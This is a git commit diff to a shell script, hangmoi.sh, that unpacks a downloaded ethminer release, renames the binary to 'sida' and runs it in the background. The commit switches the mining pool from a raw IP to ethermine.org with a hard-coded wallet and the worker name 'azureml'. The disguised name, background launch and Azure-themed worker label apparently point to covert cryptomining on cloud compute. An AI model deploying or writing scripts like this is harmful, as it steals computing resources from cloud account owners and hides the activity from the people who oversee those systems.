c30245b7408507f2571f524c8d075cad897ded78
nguyen3297 <85713242+nguyen3297@users.noreply.github.com>
2021-09-04 11:38:15 +0700

    Update hangmoi.sh

--- hangmoi.sh
+++ hangmoi.sh
@@ -11,4 +11,4 @@ wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha
 tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 cd  bin
 mv ethminer sida
-./sida -U -P http://103.133.106.124:8081/azureml &
+./sida -U -P stratum://0xe968dA3271ADCddA2496757301D2A5Ffa400CF50.azureml@us2.ethermine.org:4444 &
